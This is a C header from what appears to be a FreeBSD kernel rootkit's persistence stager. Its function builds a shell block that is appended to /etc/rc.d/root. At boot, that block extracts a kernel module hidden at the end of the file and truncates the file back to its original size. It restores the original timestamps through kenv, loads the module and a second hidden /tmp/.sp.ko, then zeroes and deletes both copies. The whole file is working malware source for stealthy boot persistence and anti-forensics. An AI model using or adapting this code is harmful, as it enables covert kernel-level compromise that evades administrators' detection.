#ifndef STAGER_RC_H
#define STAGER_RC_H

#include <sys/systm.h>

#include "config.h"
#include "times.h"
#include "persist.h"

// generate the block appended to /etc/rc.d/root
// idea is we create a marker beforehand so we know where to cut off
// after we truncate we restore times using kenv
static
void rcblock_build (char* buf, size len, size modulelen, const char* tmp, const char* tmpname)
{
	int off = snprintf(buf, len,
	    "# lol\n"
	    "/bin/sh <<'EOF'\n"
	    "/usr/bin/tail -c %ju /etc/rc.d/root | /usr/bin/head -c %ju > %s\n"
	    "/usr/bin/truncate -s %jd " CFG_ROOT_FILE "\n",
	    (uintmax_t)(modulelen+RMAGIC_LEN), (uintmax_t)modulelen, tmp,
	    (intmax_t)stager_times[0].sb.st_size);

	// pass original times through kenv
	for (size i=0; i<NSTAGER_TIMES; i++) {
		struct stager_time * t = &stager_times[i];

		off += snprintf(buf+off, len-off, "/bin/kenv -q %s=%jd >/dev/null\n", t->ka, (intmax_t)t->at.tv_sec);
		off += snprintf(buf+off, len-off, "/bin/kenv -q %s=%jd >/dev/null\n", t->km, (intmax_t)t->mt.tv_sec);
		off += snprintf(buf+off, len-off, "/bin/kenv -q %s=%jd >/dev/null\n", t->kc, (intmax_t)t->ct.tv_sec);
	}

	off += snprintf(buf+off, len-off,
	    "/sbin/kldload %s\n"
	    "/bin/dd if=/dev/zero of=%s bs=1 count=%ju conv=notrunc 2>/dev/null\n"
	    "/bin/rm -f %s\n",
	    tmp, tmp, (uintmax_t)modulelen, tmp);

	for (size i=0; i<NSTAGER_TIMES; i++) {
		struct stager_time * t = &stager_times[i];

		off += snprintf(buf+off, len-off, "/bin/kenv -q -u %s >/dev/null\n", t->ka);
		off += snprintf(buf+off, len-off, "/bin/kenv -q -u %s >/dev/null\n", t->km);
		off += snprintf(buf+off, len-off, "/bin/kenv -q -u %s >/dev/null\n", t->kc);
	}

	off += snprintf(buf+off, len-off,
	    "/sbin/kldunload %s\n"
	    "/sbin/kldload /tmp/.sp.ko\n"
	    "/bin/sleep 1\n"
	    "/sbin/kldunload .sp.ko >/dev/null 2>&1 || true\n"
	    "/bin/dd if=/dev/zero of=/tmp/.sp.ko bs=1 count=$(/usr/bin/stat -f %%z /tmp/.sp.ko) conv=notrunc 2>/dev/null\n"
	    "/bin/rm -f /tmp/.sp.ko\n"
	    "EOF\n"
	    ": <<'" RMAGIC "'\n",
	    tmpname);
}


#endif
